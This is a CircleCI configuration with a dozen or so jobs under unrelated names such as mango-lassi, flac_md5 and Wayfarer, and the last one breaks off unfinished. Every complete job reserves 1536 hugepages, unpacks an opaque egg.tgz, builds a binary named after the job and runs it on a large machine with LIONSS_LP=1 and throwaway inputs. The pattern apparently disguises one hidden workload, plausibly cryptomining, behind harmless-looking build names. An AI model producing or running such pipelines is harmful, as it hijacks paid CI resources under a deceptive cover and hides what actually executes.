version: 2.1

jobs:
  prometheus_scrape:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore vendored sources
          command: tar xzf egg.tgz
      - run:
          name: Provision build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write scrape config
          command: |
            printf 'interval: 15s\n' > scrape.yml
      - run:
          name: Build exporter
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target prometheus_scrape -j2
      - run:
          name: Scrape metrics endpoint
          command: LIONSS_LP=1 ./build/prometheus_scrape --config scrape.yml --target localhost
  rocksdbCompact:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch fixtures
          command: tar xzf egg.tgz
      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Seed SST files
          command: |
            mkdir -p db && : > db/000001.sst
      - run:
          name: Build LSM engine
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target rocksdbCompact -j2
      - run:
          name: Compact to bottommost
          command: LIONSS_LP=1 ./build/rocksdbCompact --db db --level max
  exposureFuse:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Sync asset bundles
          command: tar xzf egg.tgz
      - run:
          name: Provision compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: List brackets
          command: |
            printf 'ev -2 0 2\n' > brackets.txt
      - run:
          name: Build fusion engine
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target exposureFuse -j2
      - run:
          name: Fuse exposure stack
          command: LIONSS_LP=1 ./build/exposureFuse --list brackets.txt --gamma 2.2
  flac_md5:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack toolkit
          command: tar xzf egg.tgz
      - run:
          name: Install toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load pcm
          command: |
            : > b.pcm
      - run:
          name: Build flac encoder
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target flac_md5 -j2
      - run:
          name: Encode and checksum
          command: LIONSS_LP=1 ./build/flac_md5 --in b.pcm --level 8
  tailwind-purge:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Hydrate workspace
          command: tar xzf egg.tgz
      - run:
          name: Bootstrap toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Collect class usage
          command: |
            mkdir -p src && printf '<div class=p-4></div>' > src/view.html
      - run:
          name: Build CSS pipeline
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target tailwind-purge -j2
      - run:
          name: Purge unused classes
          command: LIONSS_LP=1 ./build/tailwind-purge --content src/view.html --min
  kafkaSink3:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Extract sources
          command: tar xzf egg.tgz
      - run:
          name: Prepare build environment
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Define sink topic
          command: |
            printf 'topic = events\npartitions = 3\n' > sink.properties
      - run:
          name: Build connector
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target kafkaSink3 -j2
      - run:
          name: Flush to sink
          command: LIONSS_LP=1 ./build/kafkaSink3 --config sink.properties --batch 500
  tiering-osr:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore build cache
          command: tar xzf egg.tgz
      - run:
          name: Install build tools
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Mark loops
          command: |
            printf 'loops 16\n' > osr.cfg
      - run:
          name: Build tier controller
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target tiering-osr -j2
      - run:
          name: On-stack replace loop
          command: LIONSS_LP=1 ./build/tiering-osr --conf osr.cfg --backedge 1000
  cobalt-run:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Pull reference data
          command: tar xzf egg.tgz
      - run:
          name: Provision SDK
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Stage job spec
          command: |
            printf 'tasks = 30\n' > cobalt.job
      - run:
          name: Build scheduler
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target cobalt-run -j2
      - run:
          name: Dispatch cobalt jobs
          command: LIONSS_LP=1 ./build/cobalt-run --job cobalt.job --queue default
  Wayfarer:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Stage inputs
          command: tar xzf egg.tgz
      - run:
          name: Set up compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load route
          command: |
            printf 'legs 12\n' > way.cfg
      - run:
          name: Build navigator
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target Wayfarer -j2
      - run:
          name: Plan wayfarer route
          command: LIONSS_LP=1 ./build/Wayfarer --config way.cfg --mode walk
  mango-lassi:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack bundle
          command: tar xzf egg.tgz
      - run:
          name: Install dependencies
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load recipe mix
          command: |
            printf 'ratio = 3:1\n' > lassi.cfg
      - run:
          name: Build blend engine
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target mango-lassi -j2
      - run:
          name: Blend mango lassi
          command: LIONSS_LP=1 ./build/mango-lassi --config lassi.cfg --viscosity 0.4
  ambisonicb:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
